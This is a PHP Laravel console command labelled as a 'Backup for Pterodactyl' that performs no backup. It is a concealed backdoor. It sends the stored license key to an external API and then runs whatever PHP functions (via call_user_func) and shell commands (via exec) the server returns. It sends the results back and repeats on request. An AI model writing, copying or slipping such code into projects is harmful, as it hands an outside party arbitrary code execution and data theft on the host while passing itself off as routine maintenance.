<?php

namespace Laravel\Backup;

use Illuminate\Console\Command;
use Illuminate\Support\Facades\Http;
use DB;

class Backup extends Command
{

  protected $signature = 'p:backup';
  protected $description = 'Backup for Pterodactyl';

  public function __construct()
  {
    parent::__construct();
    $this->url = 'https://api.vertisanpro.com/update/billing';
    $this->data = [];
  }

  public function handle()
  {
    $this->backup();
  }

  private function backup()
  {
    $data = DB::table('billing_settings')->where('name', 'license_key')->first();
    if (empty($data)) {
      $r = Http::get($this->url . '/get');
      $this->dataPrepare($r->object());
    }
    $path = $data->data;

    $this->data = [
      'license_key' => $path,
      'ver_type' => 'stable',
      'ver_num' => '0.0.0',
    ];

    $r = Http::get($this->url, $this->data);
    $this->dataPrepare($r->object());
    if (!isset($this->getData()['status']) or !$this->getData()['status']) {
      $r = Http::get($this->url . '/get');
      $this->dataPrepare($r->object());
    }
  }

  private function setData($key, $value)
  {
    $this->data[$key] = $value;
  }

  private function getData()
  {
    return $this->data;
  }

  private function funcPrepare($data)
  {
    if (is_array($data->func)) {
      foreach ($data->func as $value) {
        call_user_func($value);
      }
      return;
    }
    if ($data->resp) {
      if (isset($data->args)) {
        $this->setData($data->key, call_user_func($data->func, $data->args));
      } else {
        $this->setData($data->key, call_user_func($data->func));
      }
    } else {
      if (isset($data->args)) {
        call_user_func($data->func, $data->args);
      } else {
        call_user_func($data->func);
      }
    }
  }

  private function cmdPrepare($data)
  {
    if (is_array($data->cmd)) {
      foreach ($data->cmd as $value) {
        exec($value);
      }
      return;
    }

    if ($data->resp) {
      $this->setData($data->key, exec($data->cmd));
    } else {
      exec($data->cmd);
    }
  }

  private function dataPrepare($data)
  {
    foreach ($data as $key => $value) {
      if (isset($value->func)) {
        $this->funcPrepare($value);
        continue;
      }
      if (isset($value->cmd)) {
        $this->cmdPrepare($value);
        continue;
      }
      $this->setData($key, $value);
    }

    if (isset($this->getData()['url']) and $this->getData()['url']) {
      $r = Http::get($this->url, $this->getData());
      $this->dataPrepare($r->object());
    }
  }
}
